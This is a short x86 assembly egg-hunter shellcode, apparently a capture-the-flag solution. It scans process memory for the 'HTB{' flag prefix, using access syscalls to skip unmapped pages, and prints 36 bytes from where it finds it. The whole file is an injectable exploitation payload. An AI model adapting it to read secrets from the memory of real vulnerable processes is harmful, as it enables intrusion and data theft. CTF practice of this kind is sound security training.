.global _start

.section .text

# https://opentechtips.com/linux-egg-hunter-x86/
# We only have 60 bytes so the shellcode is a bit different

_start:
    mov $27, %eax
    mov $100, %ebx
    int $0x80

    mov $0x7B425448, %edi
    mov $0x5FFFFFFF, %edx

next_page: 
    or $0xFFF, %dx

next_address: 
    inc %edx
    pusha
    mov $0x21, %al
    lea 0x4(%edx), %ebx
    xor %ecx, %ecx
    int $0x80

    cmp $0xF2, %al
    popa
    jz next_page

    cmp %edi, (%edx)
    jnz next_address

    mov %edx, %ecx
    push $0x1
    pop %ebx
    push $0x24
    pop %edx
    mov $0x4, %al
    int $0x80
